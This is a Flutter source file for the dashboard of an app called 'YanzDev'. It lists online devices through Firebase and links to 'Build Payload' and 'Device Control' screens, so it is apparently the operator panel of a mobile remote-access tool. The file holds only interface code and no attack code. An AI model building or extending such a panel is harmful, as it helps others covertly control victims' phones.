import 'package:flutter/material.dart';
import 'payload_builder.dart';
import 'device_control.dart';
import '../services/firebase_service.dart';

class Dashboard extends StatefulWidget {
  @override
  _DashboardState createState() => _DashboardState();
}

class _DashboardState extends State<Dashboard> {
  List<String> devices = [];
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    FirebaseService.init();
    FirebaseService.listenDevices((deviceIds) {
      setState(() {
        devices = deviceIds;
        isLoading = false;
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text("YanzDev - Dashboard"), centerTitle: true),
      drawer: Drawer(
        child: ListView(
          children: [
            DrawerHeader(
              decoration: BoxDecoration(color: Colors.red[900]),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Icon(Icons.developer_mode, size: 50, color: Colors.white),
                  Text("YanzDev", style: TextStyle(fontSize: 24, color: Colors.white)),
                  Text("Developer: YanzDev", style: TextStyle(fontSize: 12, color: Colors.white70)),
                ],
              ),
            ),
            ListTile(leading: Icon(Icons.build), title: Text("Build Payload"), onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => PayloadBuilder()))),
            ListTile(leading: Icon(Icons.smartphone), title: Text("Device Control"), onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => DeviceControl()))),
            ListTile(leading: Icon(Icons.info), title: Text("About"), onTap: () => showAboutDialog(context: context, applicationName: "YanzDev", applicationVersion: "1.0", children: [Text("Created by YanzDev. For authorized use only.")])),
          ],
        ),
      ),
      body: isLoading
          ? Center(child: CircularProgressIndicator())
          : Column(
              children: [
                Padding(
                  padding: const EdgeInsets.all(16),
                  child: Text("Online Devices (${devices.length})", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
                ),
                Expanded(
                  child: devices.isEmpty
                      ? Center(child: Text("No active devices"))
                      : ListView.builder(
                          itemCount: devices.length,
                          itemBuilder: (_, i) => Card(
                            margin: EdgeInsets.symmetric(horizontal: 16, vertical: 4),
                            child: ListTile(
                              leading: Icon(Icons.phone_android, color: Colors.green),
                              title: Text(devices[i]),
                              trailing: Icon(Icons.arrow_forward),
                              onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => DeviceControl(deviceId: devices[i]))),
                            ),
                          ),
                        ),
                ),
              ],
            ),
    );
  }
}